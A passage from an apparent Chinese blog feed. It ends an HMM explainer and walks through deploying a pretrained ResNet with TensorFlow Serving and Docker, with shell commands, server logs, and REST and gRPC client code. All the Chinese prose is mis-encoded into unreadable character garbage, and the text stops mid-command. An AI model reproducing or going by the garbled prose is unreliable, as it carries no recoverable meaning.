id="yu-ce-wen-ti-jie-ma">é¢„æµ‹é—®é¢˜ï¼ˆè§£ç ï¼‰</span></h3><p>å·²çŸ¥è§‚æµ‹åºåˆ— $O=o_{1}, o_{2}, \ldots, o_{T}$ å’Œæ¨¡å‹ $\lambda=(A, B, \pi)$ï¼Œæ±‚ç»™å®šè§‚æµ‹åºåˆ—æ¡ä»¶æ¦‚ç‡ $P(I|O)$ æœ€å¤§çš„çŠ¶æ€åºåˆ— $I=\left(i_{1}, i_{2}, \ldots, i_{T}\right)$ï¼Œå³ç»™å®šè§‚æµ‹åºåˆ—ï¼Œæ±‚æœ€æœ‰å¯èƒ½çš„å¯¹åº”çš„çŠ¶æ€åºåˆ—ã€‚- ç©·ä¸¾æœç´¢- è¿‘ä¼¼è®¡ç®—- ç»´ç‰¹æ¯”ï¼ˆViterbiï¼‰ç®—æ³•ï¼šåŠ¨æ€è§„åˆ’</p><h3><span id="xue-xi-wen-ti">å­¦ä¹ é—®é¢˜</span></h3><p>å·²çŸ¥è§‚æµ‹åºåˆ— $O=o_{1}, o_{2}, \ldots, o_{T}$ï¼Œä¼°è®¡æ¨¡å‹ $\lambda=(A, B, \pi)$ï¼Œä½¿ $P(O | \lambda)$ æœ€å¤§ã€‚- ç›‘ç£ç®—æ³•ï¼šåˆ©ç”¨æå¤§ä¼¼ç„¶ä¼°è®¡- éç›‘ç£ç®—æ³•ï¼šBaum-Welchç®—æ³•ï¼ˆEMç®—æ³•åœ¨HMMä¸­çš„å…·ä½“å®ç°ï¼‰</p><h2><span id="ying-yong">åº”ç”¨</span></h2><p>è¯­éŸ³è¯†åˆ«ï¼Œä¸­æ–‡åˆ†è¯ï¼Œæ‰‹å†™è¯†åˆ«</p><h2><span id="can-kao">å‚è€ƒ</span></h2><ol><li>ã€Šç»Ÿè®¡å­¦ä¹ æ–¹æ³•ã€‹ï¼Œæèˆª</li><li><a href="https://applenob.github.io/hmm.html">éšé©¬å°”ç§‘å¤«æ¨¡å‹ï¼ˆHMMï¼‰åŠå…¶Pythonå®ç°</a></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      HMMç†è§£æ€è·¯
    
    </summary>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ TensorFlow Serving å’Œ Docker å¿«é€Ÿéƒ¨ç½²æœºå™¨å­¦ä¹ æœåŠ¡</title>
    <link href="https://qiwihui.com/qiwihui-blog-58/"/>
    <id>https://qiwihui.com/qiwihui-blog-58/</id>
    <published>2019-03-03T09:00:06.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>ä»å®éªŒåˆ°ç”Ÿäº§ï¼Œç®€å•å¿«é€Ÿéƒ¨ç½²æœºå™¨å­¦ä¹ æ¨¡å‹ä¸€ç›´æ˜¯ä¸€ä¸ªæŒ‘æˆ˜ã€‚è¿™ä¸ªè¿‡ç¨‹è¦åšçš„å°±æ˜¯å°†è®­ç»ƒå¥½çš„æ¨¡å‹å¯¹å¤–æä¾›é¢„æµ‹æœåŠ¡ã€‚åœ¨ç”Ÿäº§ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹éœ€è¦å¯é‡ç°ï¼Œéš”ç¦»å’Œå®‰å…¨ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨åŸºäºDockerçš„TensorFlow Servingæ¥ç®€å•åœ°å®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚TensorFlow ä»1.8ç‰ˆæœ¬å¼€å§‹æ”¯æŒDockeréƒ¨ç½²ï¼ŒåŒ…æ‹¬CPUå’ŒGPUï¼Œéå¸¸æ–¹ä¾¿ã€‚</p><h2><span id="huo-de-xun-lian-hao-de-mo-xing">è·å¾—è®­ç»ƒå¥½çš„æ¨¡å‹</span></h2><p>è·å–æ¨¡å‹çš„ç¬¬ä¸€æ­¥å½“ç„¶æ˜¯è®­ç»ƒä¸€ä¸ªæ¨¡å‹ï¼Œä½†æ˜¯è¿™ä¸æ˜¯æœ¬ç¯‡çš„é‡ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå·²ç»è®­ç»ƒå¥½çš„æ¨¡å‹ï¼Œæ¯”å¦‚ResNetã€‚TensorFlow Serving ä½¿ç”¨SavedModelè¿™ç§æ ¼å¼æ¥ä¿å­˜å…¶æ¨¡å‹ï¼ŒSavedModelæ˜¯ä¸€ç§ç‹¬ç«‹äºè¯­è¨€çš„ï¼Œå¯æ¢å¤ï¼Œå¯†é›†çš„åºåˆ—åŒ–æ ¼å¼ï¼Œæ”¯æŒä½¿ç”¨æ›´é«˜çº§åˆ«çš„ç³»ç»Ÿå’Œå·¥å…·æ¥ç”Ÿæˆï¼Œä½¿ç”¨å’Œè½¬æ¢TensorFlowæ¨¡å‹ã€‚è¿™é‡Œæˆ‘ä»¬ç›´æ¥ä¸‹è½½ä¸€ä¸ªé¢„è®­ç»ƒå¥½çš„æ¨¡å‹ï¼š</p><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> /tmp/resnet</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -s https://storage.googleapis.com/download.tensorflow.org/models/official/20181001_resnet/savedmodels/resnet_v2_fp32_savedmodel_NHWC_jpg.tar.gz | tar --strip-components=2 -C /tmp/resnet -xvz</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ä½¿ç”¨å…¶ä»–æ¡†æ¶æ¯”å¦‚Kerasç”Ÿæˆçš„æ¨¡å‹ï¼Œåˆ™éœ€è¦å°†æ¨¡å‹è½¬æ¢ä¸ºSavedModelæ ¼å¼ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> backend <span class="keyword">as</span> K</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">model = Sequential()</span><br><span class="line"><span class="comment"># ä¸­é—´çœç•¥æ¨¡å‹æ„å»º</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¨¡å‹è½¬æ¢ä¸ºSavedModel</span></span><br><span class="line">signature = tf.saved_model.signature_def_utils.predict_signature_def(</span><br><span class="line">    inputs=&#123;<span class="string">&#x27;input_param&#x27;</span>: model.<span class="built_in">input</span>&#125;, outputs=&#123;<span class="string">&#x27;type&#x27;</span>: model.output&#125;)</span><br><span class="line">builder = tf.saved_model.builder.SavedModelBuilder(<span class="string">&#x27;/tmp/output_model_path/1/&#x27;</span>)</span><br><span class="line">builder.add_meta_graph_and_variables(</span><br><span class="line">    sess=K.get_session(),</span><br><span class="line">    tags=[tf.saved_model.tag_constants.SERVING],</span><br><span class="line">    signature_def_map=&#123;</span><br><span class="line">        tf.saved_model.signature_constants.DEFAULT_SERVING_SIGNATURE_DEF_KEY:</span><br><span class="line">            signature</span><br><span class="line">    &#125;)</span><br><span class="line">builder.save()</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å®Œæˆåï¼Œæ–‡ä»¶ç›®å½•æ ‘ä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree /tmp/resnet</span></span><br><span class="line">/tmp/resnet</span><br><span class="line">â””â”€â”€ 1538687457</span><br><span class="line">    â”œâ”€â”€ saved_model.pb</span><br><span class="line">    â””â”€â”€ variables</span><br><span class="line">        â”œâ”€â”€ variables.data-00000-of-00001</span><br><span class="line">        â””â”€â”€ variables.index</span><br></pre></td></tr></table></figure><h2><span id="bu-shu-mo-xing">éƒ¨ç½²æ¨¡å‹</span></h2><p>ä½¿ç”¨Dockeréƒ¨ç½²æ¨¡å‹æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker pull tensorflow/serving</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -p 8500:8500 -p 8501:8501 --name tfserving_resnet \</span></span><br><span class="line"><span class="language-bash">--mount <span class="built_in">type</span>=<span class="built_in">bind</span>,<span class="built_in">source</span>=/tmp/resnet,target=/models/resnet \</span></span><br><span class="line"><span class="language-bash">-e MODEL_NAME=resnet -t tensorflow/serving</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>8500</code>ç«¯å£å¯¹äºTensorFlow Servingæä¾›çš„gRPCç«¯å£ï¼Œ<code>8501</code>ä¸ºREST APIæœåŠ¡ç«¯å£ã€‚<code>-e MODEL_NAME=resnet</code>æŒ‡å‡ºTensorFlow Servingéœ€è¦åŠ è½½çš„æ¨¡å‹åç§°ï¼Œè¿™é‡Œä¸º<code>resnet</code>ã€‚ä¸Šè¿°å‘½ä»¤è¾“å‡ºä¸º</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2019-03-04 02:52:26.610387: I tensorflow_serving/model_servers/server.cc:82] Building single TensorFlow model file config:  model_name: resnet model_base_path: /models/resnet</span><br><span class="line">2019-03-04 02:52:26.618200: I tensorflow_serving/model_servers/server_core.cc:461] Adding/updating models.</span><br><span class="line">2019-03-04 02:52:26.618628: I tensorflow_serving/model_servers/server_core.cc:558]  (Re-)adding model: resnet</span><br><span class="line">2019-03-04 02:52:26.745813: I tensorflow_serving/core/basic_manager.cc:739] Successfully reserved resources to load servable &#123;name: resnet version: 1538687457&#125;</span><br><span class="line">2019-03-04 02:52:26.745901: I tensorflow_serving/core/loader_harness.cc:66] Approving load for servable version &#123;name: resnet version: 1538687457&#125;</span><br><span class="line">2019-03-04 02:52:26.745935: I tensorflow_serving/core/loader_harness.cc:74] Loading servable version &#123;name: resnet version: 1538687457&#125;</span><br><span class="line">2019-03-04 02:52:26.747590: I external/org_tensorflow/tensorflow/contrib/session_bundle/bundle_shim.cc:363] Attempting to load native SavedModelBundle in bundle-shim from: /models/resnet/1538687457</span><br><span class="line">2019-03-04 02:52:26.747705: I external/org_tensorflow/tensorflow/cc/saved_model/reader.cc:31] Reading SavedModel from: /models/resnet/1538687457</span><br><span class="line">2019-03-04 02:52:26.795363: I external/org_tensorflow/tensorflow/cc/saved_model/reader.cc:54] Reading meta graph with tags &#123; serve &#125;</span><br><span class="line">2019-03-04 02:52:26.828614: I external/org_tensorflow/tensorflow/core/platform/cpu_feature_guard.cc:141] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</span><br><span class="line">2019-03-04 02:52:26.923902: I external/org_tensorflow/tensorflow/cc/saved_model/loader.cc:162] Restoring SavedModel bundle.</span><br><span class="line">2019-03-04 02:52:28.098479: I external/org_tensorflow/tensorflow/cc/saved_model/loader.cc:138] Running MainOp with key saved_model_main_op on SavedModel bundle.</span><br><span class="line">2019-03-04 02:52:28.144510: I external/org_tensorflow/tensorflow/cc/saved_model/loader.cc:259] SavedModel load for tags &#123; serve &#125;; Status: success. Took 1396689 microseconds.</span><br><span class="line">2019-03-04 02:52:28.146646: I tensorflow_serving/servables/tensorflow/saved_model_warmup.cc:83] No warmup data file found at /models/resnet/1538687457/assets.extra/tf_serving_warmup_requests</span><br><span class="line">2019-03-04 02:52:28.168063: I tensorflow_serving/core/loader_harness.cc:86] Successfully loaded servable version &#123;name: resnet version: 1538687457&#125;</span><br><span class="line">2019-03-04 02:52:28.174902: I tensorflow_serving/model_servers/server.cc:286] Running gRPC ModelServer at 0.0.0.0:8500 ...</span><br><span class="line">[warn] getaddrinfo: address family for nodename not supported</span><br><span class="line">2019-03-04 02:52:28.186724: I tensorflow_serving/model_servers/server.cc:302] Exporting HTTP/REST API at:localhost:8501 ...</span><br><span class="line">[evhttp_server.cc : 237] RAW: Entering the event loop ...</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒTensorFlow Servingä½¿ç”¨<code>1538687457</code>ä½œä¸ºæ¨¡å‹çš„ç‰ˆæœ¬å·ã€‚æˆ‘ä»¬ä½¿ç”¨curlå‘½ä»¤æ¥æŸ¥çœ‹ä¸€ä¸‹å¯åŠ¨çš„æœåŠ¡çŠ¶æ€ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æä¾›æœåŠ¡çš„æ¨¡å‹ç‰ˆæœ¬ä»¥åŠæ¨¡å‹çŠ¶æ€ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl http://localhost:8501/v1/models/resnet</span></span><br><span class="line">&#123;</span><br><span class="line"> &quot;model_version_status&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">   &quot;version&quot;: &quot;1538687457&quot;,</span><br><span class="line">   &quot;state&quot;: &quot;AVAILABLE&quot;,</span><br><span class="line">   &quot;status&quot;: &#123;</span><br><span class="line">    &quot;error_code&quot;: &quot;OK&quot;,</span><br><span class="line">    &quot;error_message&quot;: &quot;&quot;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="cha-kan-mo-xing-shu-ru-shu-chu">æŸ¥çœ‹æ¨¡å‹è¾“å…¥è¾“å‡º</span></h2><p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦æŸ¥çœ‹æ¨¡å‹çš„è¾“å‡ºå’Œè¾“å‡ºå‚æ•°çš„å…·ä½“å½¢å¼ï¼ŒTensorFlowæä¾›äº†ä¸€ä¸ª<code>saved_model_cli</code>å‘½ä»¤æ¥æŸ¥çœ‹æ¨¡å‹çš„è¾“å…¥å’Œè¾“å‡ºå‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">saved_model_cli show --<span class="built_in">dir</span> /tmp/resnet/1538687457/ --all</span></span><br><span class="line"></span><br><span class="line">MetaGraphDef with tag-set: &#x27;serve&#x27; contains the following SignatureDefs:</span><br><span class="line"></span><br><span class="line">signature_def[&#x27;predict&#x27;]:</span><br><span class="line">  The given SavedModel SignatureDef contains the following input(s):</span><br><span class="line">    inputs[&#x27;image_bytes&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_STRING</span><br><span class="line">        shape: (-1)</span><br><span class="line">        name: input_tensor:0</span><br><span class="line">  The given SavedModel SignatureDef contains the following output(s):</span><br><span class="line">    outputs[&#x27;classes&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_INT64</span><br><span class="line">        shape: (-1)</span><br><span class="line">        name: ArgMax:0</span><br><span class="line">    outputs[&#x27;probabilities&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_FLOAT</span><br><span class="line">        shape: (-1, 1001)</span><br><span class="line">        name: softmax_tensor:0</span><br><span class="line">  Method name is: tensorflow/serving/predict</span><br><span class="line"></span><br><span class="line">signature_def[&#x27;serving_default&#x27;]:</span><br><span class="line">  The given SavedModel SignatureDef contains the following input(s):</span><br><span class="line">    inputs[&#x27;image_bytes&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_STRING</span><br><span class="line">        shape: (-1)</span><br><span class="line">        name: input_tensor:0</span><br><span class="line">  The given SavedModel SignatureDef contains the following output(s):</span><br><span class="line">    outputs[&#x27;classes&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_INT64</span><br><span class="line">        shape: (-1)</span><br><span class="line">        name: ArgMax:0</span><br><span class="line">    outputs[&#x27;probabilities&#x27;] tensor_info:</span><br><span class="line">        dtype: DT_FLOAT</span><br><span class="line">        shape: (-1, 1001)</span><br><span class="line">        name: softmax_tensor:0</span><br><span class="line">  Method name is: tensorflow/serving/predict</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°<code>signature_def</code>ï¼Œ<code>inputs</code>çš„åç§°ï¼Œç±»å‹å’Œè¾“å‡ºï¼Œè¿™äº›å‚æ•°åœ¨æ¥ä¸‹æ¥çš„æ¨¡å‹é¢„æµ‹è¯·æ±‚ä¸­éœ€è¦ã€‚</p><h2><span id="shi-yong-mo-xing-jie-kou-yu-ce-rest-he-grpc">ä½¿ç”¨æ¨¡å‹æ¥å£é¢„æµ‹ï¼šRESTå’ŒgRPC</span></h2><p>TensorFlow Servingæä¾›REST APIå’ŒgRPCä¸¤ç§è¯·æ±‚æ–¹å¼ï¼Œæ¥ä¸‹æ¥å°†å…·ä½“è¿™ä¸¤ç§æ–¹å¼ã€‚</p><h3><span id="rest">REST</span></h3><p>æˆ‘ä»¬ä¸‹è½½ä¸€ä¸ªå®¢æˆ·ç«¯è„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬ä¼šä¸‹è½½ä¸€å¼ çŒ«çš„å›¾ç‰‡ï¼ŒåŒæ—¶ä½¿ç”¨è¿™å¼ å›¾ç‰‡æ¥è®¡ç®—æœåŠ¡è¯·æ±‚æ—¶é—´ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -o /tmp/resnet/resnet_client.py https://raw.githubusercontent.com/tensorflow/serving/master/tensorflow_serving/example/resnet_client.py</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹è„šæœ¬ä½¿ç”¨<code>requests</code>åº“æ¥è¯·æ±‚æ¥å£ï¼Œä½¿ç”¨å›¾ç‰‡çš„base64ç¼–ç å­—ç¬¦ä¸²ä½œä¸ºè¯·æ±‚å†…å®¹ï¼Œè¿”å›å›¾ç‰‡åˆ†ç±»ï¼Œå¹¶è®¡ç®—äº†å¹³å‡å¤„ç†æ—¶é—´ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># The server URL specifies the endpoint of your server running the ResNet</span></span><br><span class="line"><span class="comment"># model with the name &quot;resnet&quot; and using the predict interface.</span></span><br><span class="line">SERVER_URL = <span class="string">&#x27;http://localhost:8501/v1/models/resnet:predict&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The image URL is the location of the image we should send to the server</span></span><br><span class="line">IMAGE_URL = <span class="string">&#x27;https://tensorflow.org/images/blogs/serving/cat.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  <span class="comment"># Download the image</span></span><br><span class="line">  dl_request = requests.get(IMAGE_URL, stream=<span class="literal">True</span>)</span><br><span class="line">  dl_request.raise_for_status()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Compose a JSON Predict request (send JPEG image in base64).</span></span><br><span class="line">  jpeg_bytes = base64.b64encode(dl_request.content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  predict_request = <span class="string">&#x27;&#123;&quot;instances&quot; : [&#123;&quot;b64&quot;: &quot;%s&quot;&#125;]&#125;&#x27;</span> % jpeg_bytes</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Send few requests to warm-up the model.</span></span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    response = requests.post(SERVER_URL, data=predict_request)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Send few actual requests and report average latency.</span></span><br><span class="line">  total_time = <span class="number">0</span></span><br><span class="line">  num_requests = <span class="number">10</span></span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_requests):</span><br><span class="line">    response = requests.post(SERVER_URL, data=predict_request)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    total_time += response.elapsed.total_seconds()</span><br><span class="line">    prediction = response.json()[<span class="string">&#x27;predictions&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;Prediction class: &#123;&#125;, avg latency: &#123;&#125; ms&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">      prediction[<span class="string">&#x27;classes&#x27;</span>], (total_time*<span class="number">1000</span>)/num_requests))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœä¸º</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python resnet_client.py</span></span><br><span class="line">Prediction class: 286, avg latency: 210.12310000000002 ms</span><br></pre></td></tr></table></figure><h3><span id="grpc">gRPC</span></h3><p>è®©æˆ‘ä»¬ä¸‹è½½å¦ä¸€ä¸ªå®¢æˆ·ç«¯è„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬ä½¿ç”¨gRPCä½œä¸ºæœåŠ¡ï¼Œä¼ å…¥å›¾ç‰‡å¹¶è·å–è¾“å‡ºç»“æœã€‚è¿™ä¸ªè„šæœ¬éœ€è¦å®‰è£…<code>tensorflow-serving-api</code>è¿™ä¸ªåº“ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -o /tmp/resnet/resnet_client_grpc.py https://raw.githubusercontent.com/tensorflow/serving/master/tensorflow_serving/example/resnet_client_grpc.py</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pip install tensorflow-serving-api</span></span><br></pre></td></tr></table></figure><p>è„šæœ¬å†…å®¹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a placeholder for a Google-internal import.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tensorflow_serving.apis <span class="keyword">import</span> predict_pb2</span><br><span class="line"><span class="keyword">from</span> tensorflow_serving.apis <span class="keyword">import</span> prediction_service_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="comment"># The image URL is the location of the image we should send to the server</span></span><br><span class="line">IMAGE_URL = <span class="string">&#x27;https://tensorflow.org/images/blogs/serving/cat.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line">tf.app.flags.DEFINE_string(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;localhost:8500&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;PredictionService host:port&#x27;</span>)</span><br><span class="line">tf.app.flags.DEFINE_string(<span class="string">&#x27;image&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;path to image in JPEG format&#x27;</span>)</span><br><span class="line">FLAGS = tf.app.flags.FLAGS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">_</span>):</span><br><span class="line">  <span class="keyword">if</span> FLAGS.image:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FLAGS.image, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      data = f.read()</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># Download the image since we weren&#x27;t given one</span></span><br><span class="line">    dl_request = requests.get(IMAGE_URL, stream=<span class="literal">True</span>)</span><br><span class="line">    dl_request.raise_for_status()</span><br><span class="line">    data = dl_request.content</span><br><span class="line"></span><br><span class="line">  channel = grpc.insecure_channel(FLAGS.server)</span><br><span class="line">  stub = prediction_service_pb2_grpc.PredictionServiceStub(channel)</span><br><span class="line">  <span class="comment"># Send request</span></span><br><span class="line">  <span class="comment"># See prediction_service.proto for gRPC request/response details.</span></span><br><span class="line">  request = predict_pb2.PredictRequest()</span><br><span class="line">  request.model_spec.name = <span class="string">&#x27;resnet&#x27;</span></span><br><span class="line">  request.model_spec.signature_name = <span class="string">&#x27;serving_default&#x27;</span></span><br><span class="line">  request.inputs[<span class="string">&#x27;image_bytes&#x27;</span>].CopyFrom(</span><br><span class="line">      tf.contrib.util.make_tensor_proto(data, shape=[<span class="number">1</span>]))</span><br><span class="line">  result = stub.Predict(request, <span class="number">10.0</span>)  <span class="comment"># 10 secs timeout</span></span><br><span class="line">  <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  tf.app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„ç»“æœå¯ä»¥çœ‹åˆ°å›¾ç‰‡çš„åˆ†ç±»ï¼Œæ¦‚ç‡å’Œä½¿ç”¨çš„æ¨¡å‹ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python resnet_client_grpc.py</span></span><br><span class="line">outputs &#123;</span><br><span class="line">  key: &quot;classes&quot;</span><br><span class="line">  value &#123;</span><br><span class="line">    dtype: DT_INT64</span><br><span class="line">    tensor_shape &#123;</span><br><span class="line">      dim &#123;</span><br><span class="line">        size: 1</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    int64_val: 286</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">outputs &#123;</span><br><span class="line">  key: &quot;probabilities&quot;</span><br><span class="line">  value &#123;</span><br><span class="line">    dtype: DT_FLOAT</span><br><span class="line">    tensor_shape &#123;</span><br><span class="line">      dim &#123;</span><br><span class="line">        size: 1</span><br><span class="line">      &#125;</span><br><span class="line">      dim &#123;</span><br><span class="line">        size: 1001</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    float_val: 2.4162832232832443e-06</span><br><span class="line">    float_val: 1.9012182974620373e-06</span><br><span class="line">    float_val: 2.7247710022493266e-05</span><br><span class="line">    float_val: 4.426385658007348e-07</span><br><span class="line">    ...(ä¸­é—´çœç•¥)</span><br><span class="line">    float_val: 1.4636580090154894e-05</span><br><span class="line">    float_val: 5.812107133351674e-07</span><br><span class="line">    float_val: 6.599806511076167e-05</span><br><span class="line">    float_val: 0.0012952701654285192</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">model_spec &#123;</span><br><span class="line">  name: &quot;resnet&quot;</span><br><span class="line">  version &#123;</span><br><span class="line">    value: 1538687457</span><br><span class="line">  &#125;</span><br><span class="line">  signature_name: &quot;serving_default&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="xing-neng">æ€§èƒ½</span></h2><h3><span id="tong-guo-bian-yi-you-hua-de-tensorflow-serving-er-jin-zhi-lai-ti-gao-xing-neng">é€šè¿‡ç¼–è¯‘ä¼˜åŒ–çš„TensorFlow ServingäºŒè¿›åˆ¶æ¥æé«˜æ€§èƒ½</span></h3><p>TensorFlows servingæœ‰æ—¶ä¼šæœ‰è¾“å‡ºå¦‚ä¸‹çš„æ—¥å¿—ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA</span><br></pre></td></tr></table></figure><p>TensorFlow Servingå·²å‘å¸ƒDockeré•œåƒæ—¨åœ¨å°½å¯èƒ½å¤šåœ°ä½¿ç”¨CPUæ¶æ„ï¼Œå› æ­¤çœç•¥äº†ä¸€äº›ä¼˜åŒ–ä»¥æœ€å¤§é™åº¦åœ°æé«˜å…¼å®¹æ€§ã€‚å¦‚æœä½ æ²¡æœ‰çœ‹åˆ°æ­¤æ¶ˆæ¯ï¼Œåˆ™ä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶å¯èƒ½å·²é’ˆå¯¹ä½ çš„CPUè¿›è¡Œäº†ä¼˜åŒ–ã€‚æ ¹æ®ä½ çš„æ¨¡å‹æ‰§è¡Œçš„æ“ä½œï¼Œè¿™äº›ä¼˜åŒ–å¯èƒ½ä¼šå¯¹ä½ çš„æœåŠ¡æ€§èƒ½äº§ç”Ÿé‡å¤§å½±å“ã€‚å¹¸è¿çš„æ˜¯ï¼Œç¼–è¯‘ä¼˜åŒ–çš„TensorFlow ServingäºŒè¿›åˆ¶éå¸¸ç®€å•ã€‚å®˜æ–¹å·²ç»æä¾›äº†è‡ªåŠ¨åŒ–è„šæœ¬ï¼Œåˆ†ä»¥ä¸‹ä¸¤éƒ¨è¿›è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. ç¼–è¯‘å¼€å‘ç‰ˆæœ¬</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker build -t <span class="variable">$USER</span>/tensorflow-serving-devel -f Dockerfile.devel https://github.com/tensorflow/serving.git<span class="comment">#:tensorflow_serving/tools/docker</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. ç”Ÿäº§æ–°çš„é•œåƒ</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker build -t <span class="variable">$USER</span>/tensorflow-serving --build-arg 